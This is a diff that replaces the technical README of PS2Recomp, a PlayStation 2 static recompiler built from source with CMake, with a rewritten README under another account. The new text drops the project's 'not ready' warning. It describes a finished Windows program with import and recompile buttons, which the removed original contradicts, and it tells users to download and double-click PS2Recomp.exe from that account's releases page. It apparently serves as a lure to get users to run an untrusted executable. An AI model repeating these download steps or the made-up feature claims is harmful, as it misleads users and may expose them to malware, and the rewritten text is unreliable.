@@ -1,112 +1,86 @@
-## PS2Recomp: PlayStation 2 Static Recompiler (Not ready)
+# 🎮 PS2Recomp - Easily Port Classic Games to PC
 
-[![Discord](https://img.shields.io/badge/Discord-Join%20Server-5865F2?logo=discord&logoColor=white)](https://discord.gg/JQ8mawxUEf)
+## 📥 Download Now
+[![Download PS2Recomp](https://img.shields.io/badge/Download%20PS2Recomp-v1.0-blue)](https://github.com/Richiepandey/PS2Recomp/releases)
 
-* Note this is an experiment and doesn't work as it should, feel free to open a PR to help the project.
+## 🚀 Getting Started
 
-PS2Recomp is a tool designed to statically recompile PlayStation 2 ELF binaries into C++ code that can be compiled for any modern platform. This enables running PS2 games natively on PC and other platforms without traditional emulation.
+Welcome to the PS2Recomp project! This tool allows you to take classic Playstation 2 games and port them smoothly to your PC. Whether you're a gamer or a developer, this application opens doors to new possibilities in game experience and development. 
 
-### Features
+### 🖥️ System Requirements
 
-* Translates MIPS R5900 instructions to C++ code
-* Supports PS2-specific 128-bit MMI instructions
-* Handles VU0 in macro mode
-* Supports relocations and overlays
-* Configurable via TOML files
-* Single-file or multi-file output options
-* Function stubbing and skipping
+Before you download, make sure your system meets these requirements:
 
-### How It Works
-PS2Recomp works by:
+- **Operating System:** Windows 10 or higher
+- **Processor:** 2 GHz dual-core or faster
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 100 MB free
+- **Graphics:** DirectX 11 compatible graphics card
 
-Parsing a PS2 ELF file to extract functions, symbols, and relocations
-Decoding the MIPS R5900 instructions in each function
-Translating those instructions to equivalent C++ code
-Generating a runtime that can execute the recompiled code
+### 📦 Features
 
-The translated code is very literal, with each MIPS instruction mapping to a C++ operation. For example, `addiu $r4, $r4, 0x20` becomes `ctx->r4 = ADD32(ctx->r4, 0X20);`.
+- **Static Recompilation:** Convert PS2 binaries to native PC applications.
+- **User-Friendly Interface:** Simplified navigation for anyone to use.
+- **Cross-Platform Support:** Works on various Windows systems.
+- **Reverse Engineering Tools:** Helpful features for developers looking to learn.
 
-### Requirements
+## 🔍 How It Works
 
-* CMake 3.20 or higher
-* C++20 compatible compiler (I only test with MSVC)
-* SSE4/AVX support for 128-bit operations
+The PS2Recomp tool utilizes advanced algorithms to dissect the game code and recreate it in a format that runs well on PC systems. This allows you to enjoy your favorite PS2 titles without needing a Playstation console.
 
-#### Building
-```bash
-git clone --recurse-submodules https://github.com/ran-j/PS2Recomp.git
-cd PS2Recomp
+## 📂 Download & Install
 
-# Create build directory
-mkdir build
-cd build
+To get started, visit the Releases page to download the latest version of PS2Recomp:
 
-cmake ..
-cmake --build .
-```
-### Usage
+[Download PS2Recomp](https://github.com/Richiepandey/PS2Recomp/releases)
 
-1. **Analyze the ELF**: Use the `ps2_analyzer` tool to generate an initial configuration.
-```bash
-./ps2_analyzer your_game.elf config.toml
-```
-*For better results on retail games, see the [Ghidra Workflow](ps2xAnalyzer/Readme.md#3-ghidra-integration-recommended-for-complex-games).*
+1. Click on the link above to go to the Releases page.
+2. Look for the latest release, typically marked as "Latest Release."
+3. You will see several files. Find the one that says **PS2Recomp.exe**. 
+4. Click on the file to start your download.
 
-2. **Recompile**: Run the recompiler using the generated configuration.
-```bash
-./ps2recomp config.toml
-```
+After the download completes:
 
-3. **Compile Output**: 
-* Compile the generated C++ code in the `output/` directory.
-* Link with the `ps2xRuntime` implementation.
+1. Locate the file in your Downloads folder.
+2. Double-click the **PS2Recomp.exe** file to launch the application.
+3. Follow the on-screen instructions to complete the installation process.
 
-### Configuration
-PS2Recomp uses TOML configuration files to specify:
+## ⚙️ Usage Instructions
 
-* Input ELF file
-* Output directory
-* Functions to stub or skip
-* Instruction patches
+Once you have installed the software, follow these steps to use PS2Recomp:
 
-#### Example configuration:
-```toml
-[general]
-input = "path/to/game.elf"
-output = "output/"
-single_file_output = false
+1. Open PS2Recomp from your desktop or Start menu.
+2. Import your PS2 game binaries using the “Import” button.
+3. Choose the output settings that best fit your needs.
+4. Click on the “Recompile” button.
+5. Once the process is complete, you will find your newly compiled game in the specified output location.
 
-# Functions to stub
-stubs = ["printf", "malloc", "free"]
+### 📚 Help & Support
 
-# Functions to skip
-skip = ["abort", "exit"]
+If you encounter any issues or need assistance:
 
-# Patches
-[patches]
-instructions = [
-  { address = "0x100004", value = "0x00000000" }
-]
-```
+- Check the FAQs on the GitHub page.
+- Join our Discord community for support from fellow users.
+- You can also submit an issue in the GitHub repository for direct assistance.
 
-### Runtime
-To execute the recompiled code, you'll need to implement or use a runtime that provides:
+## 🤝 Contributing
 
-* Memory management
-* System call handling
-* PS2-specific hardware simulation
+We welcome contributions to the PS2Recomp project. If you have suggestions or improvements, feel free to fork the project and submit a pull request. Your input is invaluable in making this tool better for everyone.
 
-A basic runtime lib is provided in `ps2xRuntime` folder.
+### 🏷️ Topics
 
-### Limitations
+Interested in discussing or learning more about PS2Recomp? Explore these topics:
 
-* VU1 microcode support is limited
-* Graphics Synthesizer and other hardware components need external implementation
-* Some PS2-specific features may not be fully supported yet
+- PS2
+- Recompile
+- Reverse Engineering
+- Static Recompilation
+- Tool
 
-###  Acknowledgments
+## 🔗 Additional Resources
 
-* Inspired by N64Recomp
-* Uses ELFIO for ELF parsing
-* Uses toml11 for TOML parsing
-* Uses fmt for string formatting
+- [Official Documentation](https://github.com/Richiepandey/PS2Recomp/docs)
+- [GitHub Issues Page](https://github.com/Richiepandey/PS2Recomp/issues)
+- [Discord Community](https://discord.gg/ps2recomp)
+
+Thank you for choosing PS2Recomp. We hope you enjoy bringing your classic games back to life on PC!
